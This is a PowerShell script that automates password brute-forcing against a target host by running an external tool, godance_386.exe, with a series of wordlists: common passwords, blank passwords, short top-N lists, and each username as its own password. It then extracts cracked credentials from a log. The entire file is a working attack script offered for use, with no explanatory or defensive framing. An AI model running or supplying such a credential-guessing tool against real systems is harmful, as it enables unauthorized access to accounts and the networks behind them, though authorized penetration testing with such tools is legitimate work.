$ProgressPreference = 'SilentlyContinue'	
   
# Input Switches
[CmdletBinding()]
Param(
    [Parameter(Mandatory = $false,
    HelpMessage = 'Users list')]
    [string]$UserList,

    [Parameter(Mandatory = $false,
    HelpMessage = 'Enter Domain')]
    [string]$Domain,
    
    [Parameter(Mandatory = $true,
    HelpMessage = 'Target IP')]
    [string]$Target,
    
    [Parameter(Mandatory = $false,
    HelpMessage = 'Custom Password list')]
    [string]$PassList     
)

# these are the variables to use in the script
$global:domain2=$Domain
$global:target2=$Target
$global:userlist2=$UserList
$global:passlist=$PassList

if (!$domain2) { 
# if no domain is given then set it to a '.' 
$global:domain2="."
}

if (!$userlist2) { 
$global:userlist2="users.txt"
}


function debug {
echo "target: $target"
echo "userlist: $userlist2"
echo "domain: $domain2"
echo "passlist: $passlist2"
}  


####################################
# Godance
####################################
function godance-check-cracked {
Get-Content .\godance_brute.log | findstr "In hacker voice" | sort-object| Get-Unique > godance_brute_cracked.txt
Write-Output ""
Get-Content .\godance_brute_cracked.txt
}

function godance-password {
Write-Output ""
Write-Output "[+] password"
Write-Output ""
.\godance_386.exe -d $domain2 -u $userlist2 -w pass_password.txt -h $target2 >> godance_brute.log #2>$nul
Write-Output ""
godance-check-cracked
}
function godance-pass5 {
Write-Output ""
Write-Output "[+] pass5.txt"
Write-Output ""
.\godance_386.exe -d $domain2 -u $userlist2 -w pass5.txt -h $target2 >> godance_brute.log #2>$nul
Write-Output ""
godance-check-cracked
}
function godance-userpass {
Write-Output ""
Write-Output "[+] user = pass "
Write-Output ""
ForEach ($user in Get-Content $userlist2) {
echo $user | Out-File -Encoding ascii tempuser.txt
.\godance_386.exe -d $domain2 -u tempuser.txt -w tempuser.txt -h $target2 >> godance_brute.log
del tempuser.txt
}
Write-Output ""
godance-check-cracked
}
function godance-blank {
Write-Output ""
Write-Output "[+] pass_blank.txt"
Write-Output ""
.\godance_386.exe -d $domain2 -u $userlist2 -w pass_blank.txt -h $target2 >> godance_brute.log #2>$nul	
Write-Output ""
godance-check-cracked
}
function godance-pass10 {
Write-Output ""
Write-Output "[+] pass10.txt"
Write-Output ""
.\godance_386.exe -d $domain2 -u $userlist2 -w pass10.txt -h $target2 >> godance_brute.log #2>$nul	
Write-Output ""
godance-check-cracked
}
function godance-pass100 {
Write-Output ""
Write-Output "[+] pass100.txt"
Write-Output ""
.\godance_386.exe -d $domain2 -u $userlist2 -w pass100.txt -h $target2 >> godance_brute.log #2>$nul	
Write-Output ""
godance-check-cracked
}


echo "" > .\godance_brute.log
debug
godance-password
godance-pass5
godance-userpass
godance-blank
godance-pass10
godance-pass100